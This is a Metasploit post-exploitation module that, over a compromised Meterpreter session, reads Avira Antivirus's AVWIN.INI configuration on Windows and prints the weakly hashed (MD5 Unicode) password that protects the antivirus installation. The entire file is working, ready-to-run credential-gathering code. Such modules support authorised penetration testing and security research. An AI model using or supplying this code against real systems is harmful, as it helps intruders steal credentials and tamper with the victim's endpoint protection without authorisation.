##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/parser/ini'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Gather Avira Password Extraction',
        'Description'   => %q{
          This module extracts the weakly hashed password
          which is used to protect a Avira Antivirus (<= 15.0.17.273) installation.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Robert Kugler / robertchrk'],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))
  end

  def run
    print_status("Checking default location...")
    check_programdata("C:\\ProgramData\\Avira\\Antivirus\\CONFIG\\AVWIN.INI")
  end

  def check_programdata(path)
    begin
      client.fs.file.stat(path)
      print_status("Found file at #{path}")
      get_ini(path)
    rescue
      print_status("#{path} not found ....")
    end
  end

  def get_ini(filename)
    config = client.fs.file.new(filename, 'r')
    parse = Rex::Text.to_ascii(config.read)
    ini = Rex::Parser::Ini.from_s(parse)

    if ini == {}
      print_error("Unable to parse file")
      return
    end

    print_status("Processing configuration file...")
    passwd = ini["COMMON"]['Password']
    passwd = passwd.delete "\""
    print_good("MD5(Unicode) hash found: #{passwd}")
    print_good("Info: Password length is limited to 20 characters.")
  end
end
